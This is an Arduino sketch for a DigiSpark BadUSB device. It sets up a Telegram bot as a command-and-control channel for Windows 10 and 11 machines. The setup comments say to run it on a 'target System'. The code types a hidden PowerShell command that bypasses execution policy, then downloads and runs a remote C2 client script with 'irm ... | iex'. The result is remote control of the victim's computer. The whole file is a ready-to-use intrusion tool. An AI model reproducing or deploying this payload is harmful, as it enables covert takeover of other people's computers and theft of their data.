// Title: beigeworm's Telegram Command And Control.
// Author: @beigeworm
// Description: Using a Telegram Bot's Chat to Act as a Command and Control Platform.
// Target: Windows 10 and 11

// SETUP INSTRUCTIONS
// 1. visit https://t.me/botfather and make a bot.
// 2. click provided link to open the chat E.G. "t.me/****bot" then type or click /start)
// 3. And add the provided bot api token to the script.
// 4. Run Script on target System
// 5. Check telegram chat for 'waiting to connect' message.
// 6. this script has a feature to wait until you start the session from telegram.
// 7. type in the computer name from that message into telegram bot chat to connect to that computer.
// 8. Replace TELEGRAM_BOT_API_TOKEN_HERE Below with your Telegram Bot API Token

// MORE INFO - https://github.com/beigeworm/DigiSpark-BadUSB-Setup-Guide


#include "DigiKeyboard.h"

void setup(){
}
void loop(){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='TELEGRAM_BOT_API_TOKEN_HERE';");
  DigiKeyboard.print("irm https://raw.githubusercontent.com/beigew0rm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(5000000);
}
